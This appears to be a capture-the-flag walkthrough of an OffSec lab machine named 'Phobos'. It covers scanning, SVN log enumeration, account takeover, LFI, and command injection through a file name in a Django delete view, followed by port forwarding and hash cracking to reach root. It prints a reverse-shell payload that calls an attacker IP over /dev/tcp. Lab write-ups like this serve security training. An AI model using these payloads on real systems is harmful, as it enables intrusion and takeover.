---
icon: ubuntu
---

# Phobos - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.131 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 14:00 EDT
Nmap scan report for 192.168.209.131
Host is up (0.028s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   26.38 ms 192.168.45.1
2   26.41 ms 192.168.45.254
3   26.44 ms 192.168.251.1
4   26.71 ms 192.168.209.131
```

## <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2559).png" alt=""><figcaption></figcaption></figure>

visiting the site we see the apache2 default webpage

#### Directory Busting

```
dirsearch -u http://192.168.209.131/
```

<figure><img src="../../.gitbook/assets/image (2565).png" alt=""><figcaption></figcaption></figure>

Dirsearch found an interesting directory. When visiting `internal` we get 403 Forbidden. Let's checkout `svn`

<figure><img src="../../.gitbook/assets/image (2561).png" alt=""><figcaption></figcaption></figure>

I need creds to access it and default admin:admin creds do not work

Reviewing the request in Burpsuite I noticed the Authorization header and it uses Basic Base64 method for authenticating users&#x20;

<figure><img src="../../.gitbook/assets/image (2562).png" alt=""><figcaption></figcaption></figure>

I am going to run another directory scan using wfuzz and include the Authorization header

{% code overflow="wrap" %}
```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw=19 -t 100 -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://192.168.209.131/svn/FUZZ
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2563).png" alt=""><figcaption></figcaption></figure>

I was able to find another directory

<figure><img src="../../.gitbook/assets/image (2564).png" alt=""><figcaption></figcaption></figure>

We got access to the source code of the application!

Inside of `/users/views.py`&#x20;

```python
@staff_member_required
def remove_view_submissions(request):
    if(request.method=="POST"):
        action=request.POST["action"]
        if(action=="view"):
            f=request.POST["file"]       
            fil=open('/var/www/html/internal/submissions/'+f,'r')
            print(f)
            output=fil.read()
            return HttpResponse(content=output)


        elif(action=="delete"):
            cmd=["rm","/var/www/html/internal/submissions/{}".format(request.POST["file"])]
            cmd="/bin/bash -c 'rm /var/www/html/internal/submissions/{}'".format(request.POST["file"])
            print(cmd)
            a=os.system(cmd)
            messages.info(request,message="The file has been deleted") 

    files=subprocess.Popen(['ls','/var/www/html/internal/submissions'],stdout=subprocess.PIPE).stdout.read().decode().split('\n')
    print(files)    
    context={"files":files}
    return render(request,template_name='submissions.html',context=context)
```

This code does not validate the name of the file that is being deleted. In this case, we can attempt to upload a file with a name to inject code.

However, when trying to exploit this thing, the `internal` website does not seem to be working with all the links being broken

### <mark style="color:$primary;">SVN</mark>

svn is short for Subversion, which is a version control application that can be enumerated with the command `svn`. I enumerated it like a normal directory

Let's try to enumerate the logs of the site

{% code overflow="wrap" %}
```bash
svn log --username admin --password admin http://192.168.209.131/svn/dev
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2566).png" alt=""><figcaption></figcaption></figure>

We have access to the logs!

<figure><img src="../../.gitbook/assets/image (2567).png" alt=""><figcaption></figcaption></figure>

There is a hidden domain here. I'll add it to my /etc/hosts file

```
192.168.209.131 internal-phobos.phobos.offsec
```

<figure><img src="../../.gitbook/assets/image (2568).png" alt=""><figcaption></figcaption></figure>

`views.py` contains all of the endpoints of the site. We know there is a `/register` so I will register a user

<figure><img src="../../.gitbook/assets/image (2569).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2570).png" alt=""><figcaption></figcaption></figure>

From earlier we know The 'Submission' function is vulnerable, but we need some kind of administrator account first. So we can view the 'MyAccount' function

<figure><img src="../../.gitbook/assets/image (2571).png" alt=""><figcaption></figcaption></figure>

When I intercepted the traffic for changing the password I came across the username parameter

<figure><img src="../../.gitbook/assets/image (2572).png" alt=""><figcaption></figcaption></figure>

after changing it do admin, I was able to login ad the admin user admin:panda123

<figure><img src="../../.gitbook/assets/image (2573).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2574).png" alt=""><figcaption></figcaption></figure>

The admin user has access to additional functionality. Instead of the submission function he has a submission review function. Picking a report and viewing it sends an HTTP Post request

<figure><img src="../../.gitbook/assets/image (2575).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to LFI, and testing it reveals that it works!

<figure><img src="../../.gitbook/assets/image (2576).png" alt=""><figcaption></figcaption></figure>

Earlier, the repository comments mentioned something about a UFW firewall. A quick google search on its files reveal that the rules are stored at `/etc/ufw/user.rules`, which can be read using the LFI

<figure><img src="../../.gitbook/assets/image (2577).png" alt=""><figcaption></figcaption></figure>

This machine seems to only accept connections using port 6000, which is probably we need to use for our reverse shell. Now that we know what port to use, the only thing left is to abuse the RCE via the Delete File function.

<figure><img src="../../.gitbook/assets/image (2578).png" alt=""><figcaption></figcaption></figure>

change action to delete, as for the payload is the below and url encode it

```
test;bash -i >& /dev/tcp/192.168.45.158/6000 0>&
```

<figure><img src="../../.gitbook/assets/image (2579).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2580).png" alt=""><figcaption></figcaption></figure>

port 27017 for MongoDB is open on the machine. I'll use chisel for port forwarding

### <mark style="color:$primary;">Port Forwarding</mark>

```
./chisel_1.10.1_linux_amd64 server -p 6000 --reverse
```

<figure><img src="../../.gitbook/assets/image (2581).png" alt=""><figcaption></figcaption></figure>

Download chisel on the target machine

```bash
wget 192.168.45.158:6000/chisel_1.10.1_linux_amd64
```

{% code overflow="wrap" %}
```bash
timeout 5m ./chisel_1.10.1_linux_amd64 client 192.168.45.158:6000 R:27017:127.0.0.1:27017
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2582).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerate MongoDB</mark>

```
mongosh --host 127.0.0.1
```

<figure><img src="../../.gitbook/assets/image (2583).png" alt=""><figcaption></figcaption></figure>

There are 3 hashes stored here I will try cracking all 3

<figure><img src="../../.gitbook/assets/image (2584).png" alt=""><figcaption></figcaption></figure>

all of 3 of them are crackable&#x20;

<figure><img src="../../.gitbook/assets/image (2585).png" alt=""><figcaption></figcaption></figure>

The password works for root!
